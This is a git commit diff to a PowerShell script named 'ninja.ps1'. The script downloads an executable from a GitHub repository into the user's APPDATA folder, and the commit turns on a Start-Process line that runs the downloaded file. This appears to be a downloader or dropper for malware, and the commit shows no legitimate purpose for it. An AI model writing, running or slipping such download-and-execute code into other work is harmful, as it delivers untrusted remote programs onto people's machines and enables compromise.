f0bababc9d5ba8f20ad61b5e7ed39f0e0fcfc053
justgonnaspace <76230020+justgonnaspace@users.noreply.github.com>
2020-12-19 22:58:38 +0300

    Update ninja.ps1

--- ninja.ps1
+++ ninja.ps1
@@ -1,2 +1,2 @@
-﻿(New-Object System.Net.WebClient).DownloadFile("https://github.com/justgonnaspace/k1dd0/blob/main/K1dd0.exe?raw=true","$env:APPDATA\acbeni.exe")
-#Start-Process "$env:APPDATA\acbeni.exe"
+(New-Object System.Net.WebClient).DownloadFile("https://github.com/justgonnaspace/k1dd0/blob/main/K1dd0.exe?raw=true","$env:APPDATA\k1dd0.exe")
+Start-Process "$env:APPDATA\k1dd0.exe"
